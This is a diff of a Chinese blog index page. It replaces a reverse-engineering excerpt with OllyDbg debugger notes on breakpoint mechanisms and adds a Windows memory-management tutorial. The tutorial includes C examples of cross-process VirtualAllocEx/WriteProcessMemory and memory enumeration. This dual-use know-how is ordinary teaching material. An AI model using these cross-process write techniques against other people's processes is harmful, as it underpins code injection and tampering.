@@ -157,20 +157,20 @@
           <div id="js-content" class="content-ll">
             
   
-    <article id="post-逆向基础01" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-ollydbg软件" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2018/08/20/逆向基础01/">逆向基础01</a>
+      <a class="article-title" href="/2018/08/20/ollydbg软件/">ollydbg软件</a>
     </h1>
   
 
 		
         
-        <a href="/2018/08/20/逆向基础01/" class="archive-article-date">
+        <a href="/2018/08/20/ollydbg软件/" class="archive-article-date">
   	<time datetime="2018-08-20T08:46:07.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-08-20</time>
 </a>
         
@@ -180,16 +180,12 @@
     <div class="article-entry" itemprop="articleBody">
       
         <blockquote>
-<p>查找main函数 visual stdio</p>
+<p>od支持的调试方式<br>① 支持拖拽<br>② 支持菜单 -文件 -打开,打开的时候可以添加命令行参数<br>③ 支持右键菜单打开<br>④ 支持附加调试<br>⑤ 支持DLL调试<br>⑥ 支持多线程调试</p>
 </blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">参数:3个push</span><br><span class="line">伪代码:</span><br><span class="line">push env 应是地址</span><br><span class="line">push argv 应是地址</span><br><span class="line">push argc 可能是个变量</span><br><span class="line">call main</span><br><span class="line"></span><br><span class="line">VS2013 Main函数</span><br><span class="line">mainCRTstarup-&gt;初始化函数-&gt;main</span><br><span class="line">VS2015 Main函数</span><br><span class="line">mainCRTStartup-&gt;_scrt_common_main-&gt;_scrt_common_main_seh-&gt;invoke_main-&gt;main</span><br></pre></td></tr></table></figure>
 <blockquote>
-<p>查找WinMain函数 visual stdio</p>
+<p>od中的断点有哪些,原理分别是什么?<br>① 软件断点,F2,修改代码处为int3,异常触发再还原<br>② 硬件断点,寄存器设置地址到dr0~dr3,dr6,触发单步异常<br>③ 内存断点,修改属性(VirtualProtectEx)<br>④ 条件断点,Shift+F2,与软件断点一样<br>⑤ 消息断点，在条件基础上增加了宏定义<br>⑥ 记录断点，利用跟踪记录,然后设置条件,可以断下 </p>
 </blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">参数:4个push</span><br><span class="line">伪代码:</span><br><span class="line">push xx</span><br><span class="line">push xx</span><br><span class="line">push hPrevInstance</span><br><span class="line">push hInstance(模块基址,可能调用GetModuleHandleeA)</span><br><span class="line">call WinMain</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>VS编译器生成默认代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.checkESP</span><br><span class="line">  调用之前,cmp xxx,esp指令,call内部是jnz xxx</span><br><span class="line">  一般在函数结束时,call调用完之后出现</span><br><span class="line">2.checkStackVars</span><br><span class="line">  调用之前是lea edx,xxxx指令,call内部对0xccccccc进行判断,函数一般在函数末尾</span><br></pre></td></tr></table></figure></p>
-</blockquote>
+<p>快捷方式</p>
 
       
 
@@ -213,7 +209,122 @@
 
       
         <p class="article-more-link">
-          <a class="article-more-a" href="/2018/08/20/逆向基础01/">展开全文 >></a>
+          <a class="article-more-a" href="/2018/08/20/ollydbg软件/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+ <!-- 目录内容 -->
+             
+        <!-- 目录内容结束 -->
+
+  
+    <article id="post-windows内存管理" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/08/20/windows内存管理/">windows内存管理</a>
+    </h1>
+  
+
+		
+        
+        <a href="/2018/08/20/windows内存管理/" class="archive-article-date">
+  	<time datetime="2018-08-20T08:46:07.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-08-20</time>
+</a>
+        
+      </header>
+
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>虚拟内存概念:</p>
+<ul>
+<li>每一个进程都有4GB的虚拟内存空间</li>
+<li>低2GB为用户空间,高2GB为系统空间</li>
+<li>进程中使用的全部是虚拟地址,具体虚拟地址到物理地址的转换由操作系统内核完成(分段和分页)。</li>
+<li>一个进程的虚拟空间只有使用一部分与物理内存有映射关系。对于不同进程的同一数据,物理内存中只有一份,分别映射到多个进程中。</li>
+<li>各个进程中所使用的内存数量超过物理内存的时候,操作系统还能将物理内存中暂时用不到的数据交换到硬盘中。</li>
+</ul>
+<blockquote>
+<p>堆的内存管理</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">HANDLE      hHeap = HeapCreate(0, //操作选项（0代表无操作）</span><br><span class="line">		                           0, //初始大小（0代表初始大小是4KB）</span><br><span class="line">								   0);//最大有多大（0代表是可增长）</span><br><span class="line">	SYSTEM_INFO si;       //系统信息</span><br><span class="line">	GetSystemInfo(&amp;si);   // 获取系统信息</span><br><span class="line">	//在堆上分配3个页面大小的内存</span><br><span class="line">	LPVOID lpMem = HeapAlloc(hHeap, </span><br><span class="line">		HEAP_ZERO_MEMORY, </span><br><span class="line">		si.dwPageSize * 3);</span><br><span class="line">	HeapFree(hHeap, 0, lpMem);</span><br><span class="line">	HeapDestroy(hHeap);</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>虚拟内存的管理</p>
+</blockquote>
+<p>虚拟内存管理按照分页来管理<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">//申请一块虚拟内存</span><br><span class="line">VirtualAlloc(</span><br><span class="line">    _In_opt_ LPVOID lpAddress, //分配起始位置,自动对齐到整数位置</span><br><span class="line">    _In_ SIZE_T dwSize,	//大小</span><br><span class="line">    _In_ DWORD flAllocationType,	//预定(MEM_RELEASE)还是提交(MEM_COMMIT)</span><br><span class="line">    _In_ DWORD flProtect	//保护属性</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">//释放一块虚拟内存</span><br><span class="line">VirtualFree(</span><br><span class="line">    LPVOID lpAddress,</span><br><span class="line">    _In_ SIZE_T dwSize,</span><br><span class="line">    _In_ DWORD dwFreeType</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	//申请一块可读可写的虚拟内存</span><br><span class="line">	LPVOID lpvResult = VirtualAlloc(</span><br><span class="line">		NULL,                      //内存起始地址（NULL代表系统指定）</span><br><span class="line">		1024 * 64 * 1,             // 申请内存大小，64KB * 1</span><br><span class="line">		MEM_RESERVE | MEM_COMMIT,  // 申请内存的类型，预定并调拨内存</span><br><span class="line">		PAGE_READWRITE);           // 内存的属性，可读写</span><br><span class="line">	//向内存中写入数据</span><br><span class="line">	memcpy((LPWSTR)lpvResult, L&quot;15PB!&quot;,wcslen(L&quot;15PB!&quot;)*2);</span><br><span class="line">	//MessageBox(NULL, (LPWSTR)lpvResult, NULL, MB_OK);</span><br><span class="line">	DWORD dwOldProtect;</span><br><span class="line">	//将内存属性修改为只读</span><br><span class="line">	VirtualProtect(lpvResult, 1, PAGE_READONLY, &amp;dwOldProtect);</span><br><span class="line">	//再次向内存中写入数据</span><br><span class="line">	//因为没有可写属性，所以会触发访问异常（0xC0000005）</span><br><span class="line">	memcpy((LPWSTR)lpvResult, L&quot;hello&quot;, wcslen(L&quot;hello&quot;) * 2);</span><br><span class="line"></span><br><span class="line">	//释放虚拟内存</span><br><span class="line">	VirtualFree(lpvResult, //内存起始地址</span><br><span class="line">		0,                 //内存大小（如果是释放，则必须为0）</span><br><span class="line">		MEM_RELEASE);      //释放方式（MEM_RELEASE表示释放，</span><br><span class="line">	                       //   MEM_RESERVE表示保留，但内存状态</span><br><span class="line">	                       //   不再是MEM_COMMIT类型了）</span><br></pre></td></tr></table></figure></p>
+<ul>
+<li>跨进程读写虚拟内存<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">DWORD dwPid = 6172;</span><br><span class="line">	//获取进程句柄</span><br><span class="line">	HANDLE hProcess = </span><br><span class="line">		OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);</span><br><span class="line"></span><br><span class="line">	if (hProcess == NULL)</span><br><span class="line">	&#123;</span><br><span class="line">		printf(&quot;打开失败\n&quot;);</span><br><span class="line">		return 0;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	//申请一块内存</span><br><span class="line">	LPVOID lpBuf = VirtualAllocEx(hProcess, NULL, 1, </span><br><span class="line">		                         MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line">	DWORD dwWrite;</span><br><span class="line">	BOOL bRet = WriteProcessMemory(hProcess, </span><br><span class="line">		                      lpBuf, &quot;hello&quot;, </span><br><span class="line">		                      strlen(&quot;hello&quot;) + 1, &amp;dwWrite);</span><br><span class="line"></span><br><span class="line">	if (!bRet)</span><br><span class="line">	&#123;</span><br><span class="line">		printf(&quot;写入失败\n&quot;);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	DWORD dwOld;</span><br><span class="line">	bRet = </span><br><span class="line">		 VirtualProtectEx(hProcess, </span><br><span class="line">		                    lpBuf, 1,</span><br><span class="line">		                    PAGE_READONLY, </span><br><span class="line">		                    &amp;dwOld);</span><br><span class="line"></span><br><span class="line">	WriteProcessMemory(hProcess,</span><br><span class="line">		lpBuf, &quot;world&quot;,</span><br><span class="line">		strlen(&quot;world&quot;) + 1, &amp;dwWrite);</span><br><span class="line"></span><br><span class="line">	char strBuf[100] = &#123;&#125;;</span><br><span class="line">	DWORD dwRead;</span><br><span class="line">	ReadProcessMemory(hProcess, lpBuf, </span><br><span class="line">		       strBuf, sizeof(strBuf), &amp;dwRead);</span><br><span class="line"></span><br><span class="line">	VirtualFreeEx(hProcess, lpBuf, 0, MEM_RELEASE);</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<blockquote>
+<p>内存映射</p>
+</blockquote>
+<ol>
+<li>文件映射:将文件内容映射到进程虚拟内存中的技术</li>
+<li>映射成功的文件可以用视图view来引用这段内存,从而达到操作位于此段内存中文件的目的</li>
+<li>使用文件映射需要先创建映射对象,映射对象分为命名的和未命名的，命名的映射对象可以进行跨进程读写。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">//打开文件，获取句柄</span><br><span class="line">HANDLE hFile = CreateFile(L&quot;123.exe&quot;, //文件路径</span><br><span class="line">	GENERIC_READ | GENERIC_WRITE,     //访问方式</span><br><span class="line">	NULL,                             //安全属性（默认）</span><br><span class="line">	NULL,                             //堆栈大小（默认）</span><br><span class="line">	OPEN_EXISTING,                    //创建标志</span><br><span class="line">	FILE_ATTRIBUTE_NORMAL,            //文件标志</span><br><span class="line">	NULL);                            //文件ID</span><br><span class="line">if (hFile == INVALID_HANDLE_VALUE)</span><br><span class="line">&#123;</span><br><span class="line">	printf(&quot;文件打开失败\n&quot;);</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//创建文件映射对象</span><br><span class="line">HANDLE hMap = CreateFileMapping(hFile, //文件句柄</span><br><span class="line">	NULL,                              //安全属性</span><br><span class="line">	PAGE_READWRITE,                    //保护属性</span><br><span class="line">	NULL,                              //对象大小高字节</span><br><span class="line">	NULL,                              //对象大小低字节</span><br><span class="line">	NULL);                             //名字</span><br><span class="line"></span><br><span class="line">//与物理内存建立映射关系</span><br><span class="line">LPVOID lpMapBuf = MapViewOfFile(hMap,//映射对象</span><br><span class="line">	FILE_MAP_READ | FILE_MAP_WRITE,  //保护属性</span><br><span class="line">	NULL,                            //映射的高字节</span><br><span class="line">	NULL,                            //映射的低字节</span><br><span class="line">	NULL);                           //实际映射大小（0是默认）</span><br><span class="line">//修改文件</span><br><span class="line">char* pBuf = (char*)lpMapBuf;</span><br><span class="line">pBuf[0] = &apos;W&apos;;</span><br><span class="line">pBuf[1] = &apos;Q&apos;;</span><br><span class="line"></span><br><span class="line">//取消映射，关闭句柄</span><br><span class="line">UnmapViewOfFile(lpMapBuf);</span><br><span class="line">CloseHandle(hMap);</span><br><span class="line">CloseHandle(hFile);</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<ul>
+<li>命名map,跨进程读写<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">//进程A</span><br><span class="line">	//创建文件映射对象</span><br><span class="line">	HANDLE hMap = CreateFileMapping(NULL, //文件句柄</span><br><span class="line">		NULL,                              //安全属性</span><br><span class="line">		PAGE_READWRITE,                    //保护属性</span><br><span class="line">		NULL,                              //对象大小高字节</span><br><span class="line">		100,                               //对象大小低字节</span><br><span class="line">		L&quot;Map&quot;);                           //名字</span><br><span class="line"></span><br><span class="line">	//与物理内存建立映射关系</span><br><span class="line">	LPVOID lpMapBuf = MapViewOfFile(hMap,//映射对象</span><br><span class="line">		FILE_MAP_READ | FILE_MAP_WRITE,  //保护属性</span><br><span class="line">		NULL,                            //映射的高字节</span><br><span class="line">		NULL,                            //映射的低字节</span><br><span class="line">		NULL);                           //实际映射大小（0是默认）</span><br><span class="line">	</span><br><span class="line">	printf(&quot;----&gt;%s\n&quot;, (char*)lpMapBuf);</span><br><span class="line">	// 	memcpy(lpMapBuf, </span><br><span class="line">	// 	&quot;hello world&quot;, </span><br><span class="line">	// 	strlen(&quot;hello world&quot;) + 1);</span><br><span class="line"></span><br><span class="line">	system(&quot;pause&quot;);</span><br><span class="line"></span><br><span class="line">	UnmapViewOfFile(lpMapBuf);</span><br><span class="line">	CloseHandle(hMap);</span><br><span class="line"></span><br><span class="line">//进程B</span><br><span class="line">	HANDLE hMap = OpenFileMapping(FILE_MAP_ALL_ACCESS, </span><br><span class="line">        FALSE,</span><br><span class="line">		L&quot;Map&quot;);   </span><br><span class="line">	if(hMap == NULL)</span><br><span class="line">		return false;</span><br><span class="line">	//与物理内存建立映射关系</span><br><span class="line">	LPVOID lpMapBuf = MapViewOfFile(hMap,//映射对象</span><br><span class="line">		FILE_MAP_READ | FILE_MAP_WRITE,  //保护属性</span><br><span class="line">		NULL,                            //映射的高字节</span><br><span class="line">		NULL,                            //映射的低字节</span><br><span class="line">		NULL);                           //实际映射大小（0是默认）</span><br><span class="line">	//修改文件</span><br><span class="line">	char* pBuf = (char*)lpMapBuf;</span><br><span class="line">	pBuf[0] = &apos;W&apos;;</span><br><span class="line">	pBuf[1] = &apos;Q&apos;;</span><br><span class="line"></span><br><span class="line">	//取消映射，关闭句柄</span><br><span class="line">	UnmapViewOfFile(lpMapBuf);</span><br><span class="line">	CloseHandle(hMap);</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<blockquote>
+<p>虚拟内存遍历</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">enum MEMORYSTATE &#123;</span><br><span class="line">	e_stat_free = MEM_FREE,</span><br><span class="line">	e_stat_reserve = MEM_RESERVE,</span><br><span class="line">	e_stat_commit = MEM_COMMIT</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">enum MEMORYTYPE &#123;</span><br><span class="line">	e_type_image = MEM_IMAGE,</span><br><span class="line">	e_type_mapped = MEM_MAPPED,</span><br><span class="line">	e_type_private = MEM_PRIVATE,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">typedef struct VMINFO &#123;</span><br><span class="line">	DWORD		address;</span><br><span class="line">	DWORD		size;</span><br><span class="line">	MEMORYSTATE state;</span><br><span class="line">&#125;VMINFO;</span><br><span class="line"></span><br><span class="line">void queryVirtualMemoryStatue(HANDLE hProcess, list&lt;VMINFO&gt;* memoryStatue) &#123;</span><br><span class="line"></span><br><span class="line">	MEMORY_BASIC_INFORMATION	mbi = &#123; 0 &#125;;</span><br><span class="line">	VMINFO						statue = &#123; 0 &#125;;</span><br><span class="line">	DWORD						dwAddress = 0;</span><br><span class="line">	DWORD						dwSize = 0;</span><br><span class="line">	BOOL						bRet = FALSE;</span><br><span class="line">	while (1) &#123;</span><br><span class="line"></span><br><span class="line">		bRet = VirtualQueryEx(hProcess,</span><br><span class="line">			(LPCVOID)dwAddress,</span><br><span class="line">			&amp;mbi,</span><br><span class="line">			sizeof(MEMORY_BASIC_INFORMATION));</span><br><span class="line">		if (bRet == FALSE)</span><br><span class="line">			break;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">		statue.address = dwAddress;</span><br><span class="line">		statue.state = (MEMORYSTATE)mbi.State;</span><br><span class="line">		dwSize = mbi.RegionSize;</span><br><span class="line"></span><br><span class="line">		// 输出内存状态, </span><br><span class="line">		// 内存状态用于描述虚拟内存有没有和物理存储器进行关联.</span><br><span class="line">		// 或是否被预定.</span><br><span class="line">		// free   : 闲置,没有预定,没有和物理存储器关联</span><br><span class="line">		// reserve: 保留,被预定,没有和物理存储器关联</span><br><span class="line">		// commit : 提交,已经和物理存储器关联</span><br><span class="line">		switch (statue.state) &#123;</span><br><span class="line">		case e_stat_free:</span><br><span class="line">			printf(&quot;0x%08X : Free\n&quot;, statue.address);</span><br><span class="line">			break;</span><br><span class="line">		case e_stat_reserve:</span><br><span class="line">			printf(&quot;0x%08X : reserve\n&quot;, statue.address);</span><br><span class="line">			break;</span><br><span class="line">		case e_stat_commit:</span><br><span class="line">			printf(&quot;0x%08X : commit\n&quot;, statue.address);</span><br><span class="line">			break;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		// 如果内存地址已经提交到物理内存,则遍历提交到的每一个内存块.</span><br><span class="line">		if (statue.state == e_stat_commit) &#123;</span><br><span class="line"></span><br><span class="line">			dwSize = 0;</span><br><span class="line">			LPVOID	dwAllocationBase = mbi.AllocationBase;</span><br><span class="line">			DWORD	dwBlockAddress = (DWORD)dwAddress;</span><br><span class="line">			while (1) &#123;</span><br><span class="line"></span><br><span class="line">				bRet = VirtualQueryEx(hProcess,</span><br><span class="line">					(LPCVOID)dwBlockAddress,</span><br><span class="line">					&amp;mbi,</span><br><span class="line">					sizeof(MEMORY_BASIC_INFORMATION));</span><br><span class="line">				if (bRet == FALSE) &#123;</span><br><span class="line">					break;</span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">				// 判断遍历出来的内存块是否是同一块.(看它们的分配的首地址是否相等.)</span><br><span class="line">				// 如果不是,则跳出循环.</span><br><span class="line">				if (mbi.AllocationBase != dwAllocationBase)</span><br><span class="line">					break;</span><br><span class="line"></span><br><span class="line">				printf(&quot;\t0x%08X &quot;, dwBlockAddress);</span><br><span class="line"></span><br><span class="line">				// 输出内存类型</span><br><span class="line">				// 内存类型表示虚拟内存是以何种方式和物理存储器进行关联</span><br><span class="line">				// image  : 是从影像文件中映射而来</span><br><span class="line">				// mapped : 内存映射</span><br><span class="line">				// private: 私有内存,其它进程无法访问.</span><br><span class="line">				switch (mbi.Type) &#123;</span><br><span class="line">				case e_type_image:</span><br><span class="line">					printf(&quot; 类型: image   &quot;);</span><br><span class="line">					break;</span><br><span class="line">				case e_type_mapped:</span><br><span class="line">					printf(&quot; 类型: mapped  &quot;);</span><br><span class="line">					break;</span><br><span class="line">				case e_type_private:</span><br><span class="line">					printf(&quot; 类型: private &quot;);</span><br><span class="line">					break;</span><br><span class="line">				default:</span><br><span class="line">					break;</span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">				// 输出内存分页属性</span><br><span class="line">				// 内存分页属性用于表示内存分页能够进行何种访问,如读,写,执行,写时拷贝.</span><br><span class="line">				if (mbi.Protect == 0)</span><br><span class="line">					printf(&quot;---&quot;);</span><br><span class="line">				else if (mbi.Protect &amp; PAGE_EXECUTE)</span><br><span class="line">					printf(&quot;E--&quot;);</span><br><span class="line">				else if (mbi.Protect &amp; PAGE_EXECUTE_READ)</span><br><span class="line">					printf(&quot;ER-&quot;);</span><br><span class="line">				else if (mbi.Protect &amp; PAGE_EXECUTE_READWRITE)</span><br><span class="line">					printf(&quot;ERW&quot;);</span><br><span class="line">				else if (mbi.Protect &amp; PAGE_READONLY)</span><br><span class="line">					printf(&quot;-R-&quot;);</span><br><span class="line">				else if (mbi.Protect &amp; PAGE_READWRITE)</span><br><span class="line">					printf(&quot;-RW&quot;);</span><br><span class="line">				else if (mbi.Protect &amp; PAGE_WRITECOPY)</span><br><span class="line">					printf(&quot;WCOPY&quot;);</span><br><span class="line">				else if (mbi.Protect &amp; PAGE_EXECUTE_WRITECOPY)</span><br><span class="line">					printf(&quot;EWCOPY&quot;);</span><br><span class="line"></span><br><span class="line">				// 输出内存块的大小.</span><br><span class="line">				printf(&quot; 大小:0x%X\n&quot;, mbi.RegionSize);</span><br><span class="line"></span><br><span class="line">				// 索引到下一个内存块</span><br><span class="line">				dwBlockAddress += mbi.RegionSize;</span><br><span class="line"></span><br><span class="line">				// 累加内存块的大小</span><br><span class="line">				dwSize += mbi.RegionSize;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		statue.size = dwSize;</span><br><span class="line">		memoryStatue-&gt;push_back(statue);</span><br><span class="line"></span><br><span class="line">		// 遍历下一块虚拟内存.</span><br><span class="line">		dwAddress += dwSize;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">Window编程原理</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2018/08/20/windows内存管理/">展开全文 >></a>
         </p>
       
 
@@ -917,110 +1028,20 @@
         <!-- 目录内容结束 -->
 
   
